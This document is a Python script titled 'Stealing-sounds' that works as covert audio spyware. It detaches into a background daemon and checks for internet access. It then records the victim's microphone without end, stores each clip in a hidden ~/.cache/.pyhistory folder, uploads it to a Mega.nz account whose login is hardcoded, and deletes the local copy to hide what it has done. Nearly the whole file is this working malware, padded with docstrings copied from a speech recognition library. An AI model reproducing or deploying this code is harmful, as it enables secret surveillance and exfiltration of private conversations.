#!/usr/bin/env python3.6
#######################
#   Stealing-sounds   #
#######################
  
from time import ctime
from mega import Mega
from requests import get
from sys import implementation
from speech_recognition import Recognizer, Microphone
from os import environ, path, mkdir, remove, fork, _exit, EX_OK
from concurrent.futures import ThreadPoolExecutor as TPPE


class Upload(object):
    def __init__(self):
        self.up         = Mega()
        self.user       = 'Your Email Address' # Your Email in Mega.nz
        self.password   = 'Your Password' # Your Password in Mega.nz
    
    def LoginAndUploadFileTarget(self, file):
        try:
            m_login = self.up.login(
                email=self.user,
                password=self.password
            )
            m_login.upload(file)
            return file

        except Exception as e:
            return None

class Daemon:
    def daemon(func):
        def wrapper(*args, **kwargs):
            if fork(): return
            func(*args, **kwargs)
            _exit(EX_OK)
        return wrapper


class MicrophoneListing(object):
    """
    Creates a new ``Microphone`` instance, which represents a physical microphone on the computer. Subclass of ``AudioSource``.
    This will throw an ``AttributeError`` if you don't have PyAudio 0.2.11 or later installed.
    If ``device_index`` is unspecified or ``None``, the default microphone is used as the audio source. Otherwise, ``device_index`` should be the index of the device to use for audio input.
    A device index is an integer between 0 and ``pyaudio.get_device_count() - 1`` (assume we have used ``import pyaudio`` beforehand) inclusive. It represents an audio device such as a microphone or speaker. See the `PyAudio documentation <http://people.csail.mit.edu/hubert/pyaudio/docs/>`__ for more details.
    The microphone audio is recorded in chunks of ``chunk_size`` samples, at a rate of ``sample_rate`` samples per second (Hertz). If not specified, the value of ``sample_rate`` is determined automatically from the system's microphone settings.
    Higher ``sample_rate`` values result in better audio quality, but also more bandwidth (and therefore, slower recognition). Additionally, some CPUs, such as those in older Raspberry Pi models, can't keep up if this value is too high.
    Higher ``chunk_size`` values help avoid triggering on rapidly changing ambient noise, but also makes detection less sensitive. This value, generally, should be left at its default.
    """
    def __init__(self):
        """
        Creates a new ``Recognizer`` instance, which represents a collection of speech recognition functionality.
        """
        self.rc = Recognizer()
        self.mc = Microphone() 
        self.up = Upload() # Upload in Mega.nz
        # self.tp = TPPE()  # ProcessPoolExecutor ``threading``
        
        # if the target connect in internet 
        try: get('https://www.google.com')
        except Exception: exit()

    def listing(self):
        """
        Records a single phrase from source (an AudioSource instance) into an AudioData instance, which it returns.
        This is done by waiting until the audio has an energy above recognizer_instance.energy_threshold 
        (the user has started speaking), and then recording until it encounters recognizer_instance.pause_threshold
        seconds of non-speaking or there is no more audio input. The ending silence is not included.
        The timeout parameter is the maximum number of seconds that this will wait for a phrase to start
        before giving up and throwing an speech_recognition.WaitTimeoutError exception. 
        If timeout is None, there will be no wait timeout.
        """
        with self.mc as source:
            audio = self.rc.listen(
                source,
                timeout=50
            )
            
            return audio
    
    def processing(self, *args, **kwargs):
        """
        Returns a byte string representing the contents of a WAV file containing 
        the audio represented by the AudioData instance.
        If convert_width is specified and the audio samples are not convert_width 
        bytes each, the resulting audio is converted to match.
        If convert_rate is specified and the audio sample rate is not convert_rate
        Hz, the resulting audio is resampled to match.
        Writing these bytes directly to a file results in a valid WAV file 
        <https://en.wikipedia.org/wiki/WAV>__.
        """
        data, *_ = args
        assert data.get_wav_data
        try:
            packet = data.get_wav_data(
                convert_rate=None,
                convert_width=None
            )
            # Step[1] : Save packet 
            try_save = self.save(packet)
            if try_save:
                # Step[2] : Upload packet 
                try_upload = self.up.LoginAndUploadFileTarget(try_save)
                
                if try_upload:
                    # Step[3] : Delete packet  
                    self.delete(try_upload)
        except Exception as e:
            pass


    def threading(self, *args, **kwargs):
        """Initializes a new ProcessPoolExecutor instance.

        Args:
            max_workers: The maximum number of processes that can be used to
                execute the given calls. If None or not given then as many
                worker processes will be created as the machine has processors.
        """
        data, *_ = args
        with TPPE() as obj2:  # ProcessPoolExecutor() --> obj2
            rSet = obj2.submit(self.processing, data)
        

    def save(self, *args, **kwargs):
        print(f"{R}save{N}")

        """Save file wav in pc target"""
        packet, *_ = args
        
        try:
            # Ex1 -> /{DIRHOME}/.cache/.pyhistory 
            name_path       = path.join(environ.get('HOME'), '.cache', '.pyhistory')
            # Ex2 -> {NameSystem}-{TimeNow}.wav
            name_file       = f'{implementation._multiarch}-{ctime().split()[-2]}'
            # Ex3 -> /{DIRHOME}/.cache/.pyhistory/{NameSystem}-{TimeNow}.wav
            name_end_target = path.join(name_path, name_file)
            
            if not path.isdir(name_path): mkdir(name_path)
            open(name_end_target, 'wb').write(packet)
            return name_end_target

        except Exception as e:
            return None
    

    def delete(self, *args, **kwargs):
        """Delete file wav in pc target"""
        file_target_delete, *_ = args
        
        try: remove(file_target_delete)
        except FileNotFoundError: pass

    def main(self):
        """
        Loop All Time for ``listing`` in while   
        """
        while True:
            packet = self.listing()
            self.threading(packet)


@Daemon.daemon
def main():
    obj = MicrophoneListing()
    try: obj.main()
    except Exception: exit()


if __name__ == "__main__":
    main()
